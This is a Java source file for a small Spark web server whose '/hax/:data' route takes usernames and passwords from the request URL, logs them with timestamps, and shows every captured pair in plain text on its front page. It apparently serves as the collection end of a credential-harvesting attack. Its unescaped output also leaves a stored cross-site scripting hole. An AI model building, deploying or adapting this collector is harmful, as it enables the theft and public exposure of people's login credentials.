package com.lh.passr;

import com.google.common.collect.ArrayListMultimap;
import com.google.common.collect.Multimap;
import org.apache.commons.lang3.tuple.ImmutablePair;
import org.apache.commons.lang3.tuple.Pair;
import spark.Request;

import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Map;

import static spark.Spark.get;
import static spark.SparkBase.staticFileLocation;

public class AttachmentController {

    private static Multimap<Date, Pair<String, String>> passwordLog;
    private static DateFormat dateFormat = new SimpleDateFormat("MM/dd/yyyy HH:mm:ss");

    public static void main(String[] args) {
        passwordLog = ArrayListMultimap.create();
        staticFileLocation("/resources");
        get("/hax/:data", (req, res) -> logAndDisplayPass(req));

        get("/", (req, res) -> displayPassPage());
    }

    private static String pagePre = "" +
            "<html>" +
            "<head><style>" +
            "body{ padding: 15px; background: url(\"http://freegeneraldirectories.com/wp-content/uploads/2014/04/white-background-tumblrwhite-background-matrix-by-jimeye-on-deviantart-ezlgpcp4-340x180.jpg\"); color: black; font-family: arial, san-serif; font-weight: 400;}" +
            "table{ background: white; font-size: 36px; }" +
            "table td { padding: 10px 30px 10px 30px; border: 1px solid #000;}" +
            "</style></head><body>";

    private static String pageSuf = "" +
            "</body></html>";

    private static String logAndDisplayPass(Request req) {
        Pair usernameAndPasswordPair = new ImmutablePair<>(usernameFrom(req), passwordFrom(req));
        Date currentTime = new Date();
        passwordLog.put(currentTime, usernameAndPasswordPair);
        String pageContent = displayPassPage();
        return pageContent;
    }

    private static String displayPassPage() {
        String bodyContent = passLogTable();
        return pagePre + bodyContent + pageSuf;
    }

    private static String passwordFrom(Request req) {
        String passKeyword = "&pass=";

        String params = req.params(":data");
        int passStartIndex = passKeyword.length() + params.indexOf(passKeyword);
        return params.substring(passStartIndex);
    }

    private static String usernameFrom(Request req) {
        String params = req.params(":data");
        int userEndIndex = params.indexOf("&pass=");
        int userStartIndex = 1 + params.indexOf('=');
        return params.substring(userStartIndex, userEndIndex);
    }

    private static String passLogTable() {
        String table = "<table>";

        table = table.concat(
                "<tr><th>Time</th><th>Username</th><th>Password</th></tr>"
        );

        for (Map.Entry<Date, Pair<String, String>> entry : passwordLog.entries()) {
            table = table.concat(
                    "<tr><td>" + dateFormat.format(entry.getKey()) + "</td><td>" + entry.getValue().getLeft() + "</td><td>" + entry.getValue().getRight() + "</td></tr>"
            );
        }

        table = table.concat(
                "</table>"
        );
        return table;
    }

}